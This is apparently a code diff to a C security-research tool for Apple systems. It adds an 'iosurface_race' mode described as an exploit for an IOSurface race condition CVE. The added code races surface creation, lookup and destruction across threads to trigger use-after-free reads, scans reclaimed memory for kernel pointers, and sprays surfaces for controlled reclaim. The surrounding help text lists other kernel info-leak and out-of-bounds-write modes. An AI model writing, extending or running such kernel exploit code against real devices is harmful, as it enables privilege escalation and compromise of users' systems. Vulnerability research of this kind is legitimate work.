@@ -14171,7 +14171,7 @@ vps_cd_done:
 
     } else if (strcmp(mode, "sysctl_leak") == 0 || strcmp(mode, "ave_prop_scan") == 0 ||
                strcmp(mode, "state_leak") == 0 || strcmp(mode, "registry_leak") == 0 ||
-               strcmp(mode, "task_leak") == 0) {
+               strcmp(mode, "task_leak") == 0 || strcmp(mode, "iosurface_race") == 0) {
         goto new_modes;
 
     } else {
@@ -14236,6 +14236,7 @@ vps_cd_done:
         rlog("  state_leak [phase]                 -- KEY: IOSurface/AGX/JPEG state management info leak\n");
         rlog("  registry_leak [phase]              -- KEY: IORegistry property + CMSampleBuffer KPTR scan\n");
         rlog("  task_leak [phase]                  -- KEY: Mach task/thread/host info + compression leak\n");
+        rlog("  iosurface_race [rounds] [threads]   -- KEY: CVE-112477 IOSurface race condition exploit\n");
         rlog("  diag3          -- Multi-image stereo encode (CMTaggedBufferGroup)\n");
         rlog("\nKey entry thresholds (TABLE 1):\n");
         rlog("  256 (~86 enc):  First OOB write\n");
@@ -16354,6 +16355,309 @@ new_modes:
         }
 
         rlog("\n=== TASK_LEAK complete. Total KPTR candidates: %d ===\n", kptr_found);
+
+    } else if (strcmp(mode, "iosurface_race") == 0) {
+        /*
+         * iosurface_race — CVE-2026-112477 IOSurface race condition
+         *
+         * Phase 1: Measure IOSurface create/destroy timing
+         * Phase 2: Race IOSurface create vs lookup (concurrent threads)
+         * Phase 3: Race IOSurface destroy vs property-get (UAF read attempt)
+         * Phase 4: Spray + race for controlled reclaim
+         */
+        int rounds = (argc > 2) ? atoi(argv[2]) : 500;
+        int nthreads = (argc > 3) ? atoi(argv[3]) : 4;
+        if (rounds < 10) rounds = 10;
+        if (nthreads < 2) nthreads = 2;
+        if (nthreads > 8) nthreads = 8;
+
+        rlog("=== IOSURFACE_RACE: CVE-2026-112477 race condition probe ===\n");
+        rlog("rounds=%d threads=%d\n\n", rounds, nthreads);
+
+        int kptr_found = 0;
+
+        /* ===== Phase 1: Timing + baseline ===== */
+        rlog("--- Phase 1: IOSurface create/destroy timing ---\n");
+
+        /* Create a template surface properties dict */
+        int width_val = 64, height_val = 64, bpe_val = 4, pf_val = 0x42475241; /* BGRA */
+        CFNumberRef w = CFNumberCreate(NULL, kCFNumberIntType, &width_val);
+        CFNumberRef h = CFNumberCreate(NULL, kCFNumberIntType, &height_val);
+        CFNumberRef bpe = CFNumberCreate(NULL, kCFNumberIntType, &bpe_val);
+        CFNumberRef pf = CFNumberCreate(NULL, kCFNumberIntType, &pf_val);
+
+        CFStringRef keys[] = {
+            CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+            CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")
+        };
+        CFTypeRef vals[] = { w, h, bpe, pf };
+        CFDictionaryRef props = CFDictionaryCreate(NULL,
+            (const void **)keys, (const void **)vals, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        /* Measure create/destroy cycle times */
+        uint64_t t0 = mach_absolute_time();
+        for (int i = 0; i < 100; i++) {
+            IOSurfaceRef s = IOSurfaceCreate(props);
+            if (s) {
+                uint32_t sid = IOSurfaceGetID(s);
+                (void)sid;
+                CFRelease(s);
+            }
+        }
+        uint64_t t1 = mach_absolute_time();
+        double avg_ns = (double)(t1 - t0) / 100.0;
+        rlog("  100 create/destroy cycles: %.0f ticks total, %.0f avg\n", (double)(t1 - t0), avg_ns);
+
+        /* Measure lookup timing */
+        IOSurfaceRef test_surf = IOSurfaceCreate(props);
+        uint32_t test_id = test_surf ? IOSurfaceGetID(test_surf) : 0;
+        rlog("  Test surface ID: %u\n", test_id);
+
+        t0 = mach_absolute_time();
+        for (int i = 0; i < 100; i++) {
+            IOSurfaceRef looked = IOSurfaceLookup(test_id);
+            if (looked) CFRelease(looked);
+        }
+        t1 = mach_absolute_time();
+        rlog("  100 lookups: %.0f ticks avg\n", (double)(t1 - t0) / 100.0);
+
+        if (test_surf) CFRelease(test_surf);
+        rlog("  After release, lookup(ID=%u): %p\n", test_id,
+             (void*)IOSurfaceLookup(test_id));
+
+        /* ===== Phase 2: Race create vs lookup ===== */
+        rlog("\n--- Phase 2: Race create vs concurrent lookup ---\n");
+
+        /* Shared state for race threads */
+        typedef struct {
+            _Atomic uint32_t current_id;
+            _Atomic int go;
+            _Atomic int stop;
+            _Atomic int uaf_hits;
+            _Atomic int lookup_ok;
+            _Atomic int lookup_null;
+            CFDictionaryRef props;
+        } race_state_t;
+
+        __block race_state_t rstate = {0};
+        rstate.props = props;
+
+        /* Creator thread: rapidly create and destroy surfaces */
+        dispatch_queue_t creator_q = dispatch_queue_create("creator", NULL);
+        dispatch_queue_t looker_q = dispatch_queue_create("looker", DISPATCH_QUEUE_CONCURRENT);
+
+        __block int race_rounds = rounds;
+
+        dispatch_async(creator_q, ^{
+            while (!rstate.go) usleep(10);
+            for (int i = 0; i < race_rounds && !rstate.stop; i++) {
+                IOSurfaceRef s = IOSurfaceCreate(rstate.props);
+                if (s) {
+                    rstate.current_id = IOSurfaceGetID(s);
+                    /* Destroy immediately — race window */
+                    CFRelease(s);
+                    rstate.current_id = 0;
+                }
+            }
+            rstate.stop = 1;
+        });
+
+        /* Looker threads: try to lookup the ID during the race window */
+        for (int t = 0; t < nthreads; t++) {
+            dispatch_async(looker_q, ^{
+                while (!rstate.go) usleep(10);
+                while (!rstate.stop) {
+                    uint32_t id = rstate.current_id;
+                    if (id == 0) continue;
+                    IOSurfaceRef found = IOSurfaceLookup(id);
+                    if (found) {
+                        rstate.lookup_ok++;
+                        /* Check if surface properties are sane */
+                        size_t alloc_sz = IOSurfaceGetAllocSize(found);
+                        uint32_t w_found = IOSurfaceGetWidth(found);
+                        uint32_t h_found = IOSurfaceGetHeight(found);
+                        if (w_found != 64 || h_found != 64 || alloc_sz == 0) {
+                            rstate.uaf_hits++;
+                        }
+                        CFRelease(found);
+                    } else {
+                        rstate.lookup_null++;
+                    }
+                }
+            });
+        }
+
+        rstate.go = 1;
+        /* Wait for completion */
+        dispatch_sync(creator_q, ^{});
+
+        rlog("  Race results: lookup_ok=%d lookup_null=%d uaf_hits=%d\n",
+             rstate.lookup_ok, rstate.lookup_null, rstate.uaf_hits);
+
+        /* ===== Phase 3: Race destroy vs property read ===== */
+        rlog("\n--- Phase 3: Race destroy vs property access ---\n");
+
+        __block race_state_t rstate3 = {0};
+        rstate3.props = props;
+
+        dispatch_queue_t destroy_q = dispatch_queue_create("destroyer", NULL);
+        dispatch_queue_t reader_q = dispatch_queue_create("reader", DISPATCH_QUEUE_CONCURRENT);
+
+        __block IOSurfaceRef *surf_pool = calloc(rounds, sizeof(IOSurfaceRef));
+        __block uint32_t *id_pool = calloc(rounds, sizeof(uint32_t));
+
+        /* Pre-create surfaces */
+        rlog("  Pre-creating %d surfaces...\n", rounds);
+        for (int i = 0; i < rounds; i++) {
+            surf_pool[i] = IOSurfaceCreate(props);
+            if (surf_pool[i]) {
+                id_pool[i] = IOSurfaceGetID(surf_pool[i]);
+                /* Write known data to surface base address */
+                void *base = IOSurfaceGetBaseAddress(surf_pool[i]);
+                if (base) {
+                    IOSurfaceLock(surf_pool[i], 0, NULL);
+                    memset(base, 0x41, 64 * 64 * 4);
+                    /* Write a canary pattern at known offset */
+                    uint64_t canary = 0xDEADBEEFCAFEBABEULL;
+                    memcpy(base, &canary, 8);
+                    IOSurfaceUnlock(surf_pool[i], 0, NULL);
+                }
+            }
+        }
+
+        __block _Atomic int destroy_idx = 0;
+        __block _Atomic int read_anomalies = 0;
+        __block _Atomic int kptr_race = 0;
+        __block int r3_rounds = rounds;
+
+        /* Destroyer: release surfaces one by one */
+        dispatch_async(destroy_q, ^{
+            while (!rstate3.go) usleep(10);
+            for (int i = 0; i < r3_rounds && !rstate3.stop; i++) {
+                if (surf_pool[i]) {
+                    destroy_idx = i;
+                    CFRelease(surf_pool[i]);
+                    surf_pool[i] = NULL;
+                }
+            }
+            rstate3.stop = 1;
+        });
+
+        /* Readers: lookup by ID and check data */
+        for (int t = 0; t < nthreads; t++) {
+            dispatch_async(reader_q, ^{
+                while (!rstate3.go) usleep(10);
+                while (!rstate3.stop) {
+                    int idx = destroy_idx;
+                    if (idx <= 0 || idx >= r3_rounds) continue;
+
+                    /* Try to read a surface that may be being destroyed */
+                    uint32_t target_id = id_pool[idx];
+                    if (target_id == 0) continue;
+
+                    IOSurfaceRef s = IOSurfaceLookup(target_id);
+                    if (s) {
+                        void *base = IOSurfaceGetBaseAddress(s);
+                        if (base) {
+                            IOSurfaceLock(s, kIOSurfaceLockReadOnly, NULL);
+                            /* Check if canary is corrupted (reclaimed memory) */
+                            uint64_t val = 0;
+                            memcpy(&val, base, 8);
+                            if (val != 0xDEADBEEFCAFEBABEULL && val != 0x0) {
+                                read_anomalies++;
+                                /* Scan for kernel pointers */
+                                size_t sz = IOSurfaceGetAllocSize(s);
+                                if (sz > 0 && sz < 1024*1024) {
+                                    for (size_t si = 0; si + 7 < sz && si < 4096; si += 8) {
+                                        uint64_t v = 0;
+                                        memcpy(&v, (uint8_t*)base + si, 8);
+                                        if ((v & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL ||
+                                            (v & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
+                                            if (v != 0xFFFFFFFFFFFFFFFFULL) {
+                                                kptr_race++;
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                            IOSurfaceUnlock(s, kIOSurfaceLockReadOnly, NULL);
+                        }
+                        CFRelease(s);
+                    }
+                }
+            });
+        }
+
+        rstate3.go = 1;
+        dispatch_sync(destroy_q, ^{});
+        usleep(100000); /* Let readers drain */
+
+        rlog("  Destroy-vs-read: anomalies=%d kptr_hits=%d\n",
+             read_anomalies, kptr_race);
+        kptr_found += kptr_race;
+
+        /* Cleanup */
+        for (int i = 0; i < rounds; i++) {
+            if (surf_pool[i]) CFRelease(surf_pool[i]);
+        }
+        free(surf_pool);
+        free(id_pool);
+
+        /* ===== Phase 4: Spray + re-lookup after destroy ===== */
+        rlog("\n--- Phase 4: Spray after destroy + re-lookup ---\n");
+
+        for (int round = 0; round < 20; round++) {
+            /* Create a surface, record its ID */
+            IOSurfaceRef victim = IOSurfaceCreate(props);
+            if (!victim) continue;
+            uint32_t vid = IOSurfaceGetID(victim);
+
+            /* Get a second reference via lookup */
+            IOSurfaceRef ref2 = IOSurfaceLookup(vid);
+
+            /* Release original */
+            CFRelease(victim);
+
+            /* Spray small IOSurfaces to reclaim */
+            IOSurfaceRef sprays[64];
+            for (int i = 0; i < 64; i++) {
+                sprays[i] = IOSurfaceCreate(props);
+            }
+
+            /* Check if ref2 now points to reclaimed memory */
+            if (ref2) {
+                void *base = IOSurfaceGetBaseAddress(ref2);
+                if (base) {
+                    IOSurfaceLock(ref2, kIOSurfaceLockReadOnly, NULL);
+                    uint64_t val = 0;
+                    memcpy(&val, base, 8);
+                    size_t allocsz = IOSurfaceGetAllocSize(ref2);
+                    uint32_t rw = IOSurfaceGetWidth(ref2);
+                    uint32_t rh = IOSurfaceGetHeight(ref2);
+
+                    if (rw != 64 || rh != 64) {
+                        rlog("  Round %d: RECLAIM? vid=%u w=%u h=%u alloc=%zu val=0x%016llx\n",
+                             round, vid, rw, rh, allocsz, val);
+                        kptr_found++;
+                    }
+                    IOSurfaceUnlock(ref2, kIOSurfaceLockReadOnly, NULL);
+                }
+                CFRelease(ref2);
+            }
+
+            for (int i = 0; i < 64; i++) {
+                if (sprays[i]) CFRelease(sprays[i]);
+            }
+        }
+
+        CFRelease(props);
+        CFRelease(w);
+        CFRelease(h);
+        CFRelease(bpe);
+        CFRelease(pf);
+
+        rlog("\n=== IOSURFACE_RACE complete. Total KPTR/anomaly: %d ===\n", kptr_found);
     }
 
 done:
